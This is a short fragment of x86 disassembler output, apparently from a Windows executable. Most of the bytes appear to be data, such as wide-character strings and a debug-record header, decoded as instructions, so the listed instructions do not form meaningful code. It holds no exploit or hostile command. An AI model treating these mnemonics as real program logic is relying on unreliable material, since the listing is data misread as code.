  434818:	add    BYTE PTR [eax+eax*1+0x5a],cl
  43481c:	add    BYTE PTR [eax],al
  43481e:	add    BYTE PTR [ecx+0x0],dl
  434821:	push   edi
  434822:	add    BYTE PTR [ecx+0x0],bl
  434825:	pop    edi
  434826:	add    BYTE PTR [esi+0x0],dl
  434829:	xor    al,0x0
  43482b:	inc    esp
  43482c:	add    BYTE PTR [ecx],dh
  43482e:	add    BYTE PTR [eax],bh
  434830:	add    BYTE PTR [edx],dh
  434832:	add    BYTE PTR [edi+0x0],bl
  434835:	cmp    DWORD PTR [eax],eax
  434837:	push   esp
  434838:	add    BYTE PTR [eax+eax*1+0x0],dl
  43483c:	add    BYTE PTR [esi+0x0],dl
  43483f:	dec    edi
  434840:	add    BYTE PTR [edi+0x0],al
  434843:	add    BYTE PTR ss:[edi+0x0],bl
  434847:	dec    edi
  434848:	add    BYTE PTR [edx+0x0],bl
  43484b:	inc    ebp
  43484c:	add    BYTE PTR [eax],dh
  43484e:	add    BYTE PTR [ebp+0x0],al
  434851:	xor    BYTE PTR [eax],al
  434853:	pop    edi
  434854:	add    BYTE PTR [eax],dh
  434856:	add    BYTE PTR ds:0x4f000000,dh
  43485c:	add    BYTE PTR ds:0x5f005700,dh
  434862:	add    BYTE PTR [edi],dh
  434864:	add    BYTE PTR [ebx+0x0],dl
  434867:	push   ebp
  434868:	add    BYTE PTR [edi+0x0],al
  43486b:	xor    al,0x0
  43486d:	pop    edi
  43486e:	add    BYTE PTR [ecx+0x0],dl
  434871:	inc    esp
  434872:	add    BYTE PTR [eax],al
  434874:	add    BYTE PTR [edx+0x0],dl
  434877:	push   esp
  434878:	add    BYTE PTR ds:0x52005f00,dh
  43487e:	add    BYTE PTR [edi+0x0],dl
  434881:	xor    al,BYTE PTR [eax]
  434883:	xor    al,BYTE PTR [eax]
  434885:	xor    BYTE PTR [eax],al
  434887:	xor    BYTE PTR [eax],al
  434889:	pop    edi
  43488a:	add    BYTE PTR [esi],dh
  43488c:	add    BYTE PTR [eax],al
  43488e:	add    BYTE PTR [eax+0x0],cl
  434891:	inc    ebp
  434892:	add    BYTE PTR [eax+eax*1+0x30],cl
  434896:	add    BYTE PTR [edi+0x0],bl
  434899:	dec    edx
  43489a:	add    BYTE PTR [edx],dh
  43489c:	add    BYTE PTR [edi],dh
  43489e:	add    BYTE PTR [ebp+0x0],dl
  4348a1:	add    BYTE PTR ss:[eax],dh
  4348a4:	add    BYTE PTR [eax],al
  4348a6:	add    BYTE PTR [esi+0x0],dl
  4348a9:	cmp    BYTE PTR [eax],al
  4348ab:	dec    edi
  4348ac:	add    BYTE PTR [ecx],bh
  4348ae:	add    BYTE PTR [edi+0x0],bl
  4348b1:	pop    eax
  4348b2:	add    BYTE PTR [edx+0x0],bl
  4348b5:	dec    esp
  4348b6:	add    BYTE PTR [ebx+0x0],cl
  4348b9:	add    BYTE PTR [eax],al
  4348bb:	dec    ecx
  4348bc:	add    BYTE PTR [ebp+0x0],dl
  4348bf:	dec    edi
  4348c0:	add    BYTE PTR [eax],al
  4348c2:	add    BYTE PTR [edx+0x53],dl
  4348c5:	inc    esp
  4348c6:	push   ebx
  4348c7:	aad    0x9d
  4348c9:	adc    dl,BYTE PTR [ebx*2-0x4fb70b2f]
  4348d0:	dec    edi
  4348d1:	pop    esp
  4348d2:	cs jmp 0x1b176ea7
  4348d8:	add    BYTE PTR [eax],al
  4348da:	add    BYTE PTR [ebx+0x3a],dl
  4348dd:	pop    esp
  4348de:	popa   
  4348df:	jbe    0x434956
  4348e1:	jns    0x434950
  4348e3:	dec    ecx
  4348e4:	jb     0x434960
  4348e6:	pop    esp
  4348e7:	bound  di,DWORD PTR [edx+0x52]
  4348eb:	gs fs push ax
  4348ef:	arpl   WORD PTR [esi+0x5c],si
  4348f2:	js     0x43494e
  4348f4:	je     0x43493d
  4348f6:	jno    0x43493a
  4348f8:	jno    0x434961
  4348fa:	bound  ebp,QWORD PTR [esi]
  4348fc:	jo     0x434962
  4348fe:	bound  eax,QWORD PTR [eax]
	...
